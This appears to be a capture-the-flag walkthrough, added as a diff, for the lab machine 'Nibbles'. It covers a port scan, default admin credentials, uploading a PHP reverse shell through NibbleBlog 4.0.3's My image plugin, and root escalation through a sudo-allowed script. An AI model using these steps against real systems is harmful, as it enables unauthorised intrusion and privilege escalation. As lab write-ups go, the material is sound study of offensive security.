@@ -1,0 +1,66 @@
+System : OV Scan
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Aggressive OS guesses: Linux 3.16 (95%), Linux 3.2 - 4.8 (95%), 
+Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (95%),
+Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.12 (94%), Linux 3.13 (94%), Linux 3.18 (94%)
+
+Hack : 
+
+- curl ip
+<b>Hello world!</b>
+<!-- /nibbleblog/ directory. Nothing interesting here! -->
+
+- dirb http://10.10.10.75/nibbleblog/ -r 
+
+Found admin pannel page -
+http://10.10.10.75/nibbleblog/admin.php                                                                  
+
+- Access the above admin page using the default credentials as below :
+username : admin
+password : nibbles
+
+- Check the affected product version 
+Affected Product:   NibbleBlog 4.0.3  
+
+- Vulnerability Description
+When uploading image files via the "My image" plugin - which is
+delivered with NibbleBlog by default - , NibbleBlog 4.0.3 keeps the
+original extension of uploaded files. This extension or the actual file
+type are not checked, thus it is possible to upload PHP files and gain
+code execution.
+
+- Activate My image plugin by visiting plugn page
+http://localhost/nibbleblog/admin.php?controller=plugins&action=install&plugin=my_image 
+
+- Configure the my_image plugin  
+Upload PHP shell and ignore warnings (Location on kali : /usr/share/webshells/php/php-reverse-shell.php ) ## Modify the shell ## 
+ 
+- Open the listner and execute the shell by Visiting : 
+http://localhost/nibbleblog/content/private/plugins/my_image/image.php
+
+- Here you get the user shell.
+
+Priv escalation : 
+
+- Use command sudo -l to see what you can execute
+User nibbler may run the following commands on Nibbles:
+(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+
+- Put command as mentioned below inside the script which we can execute using sudo 
+$ echo 'cat /root/root.txt' > monitor.sh
+
+- execute the monitor.sh script using sudo
+sudo ./monitor.sh
+
+- here you get the hash of root.txt
+
+
+
+
+
+
+
+
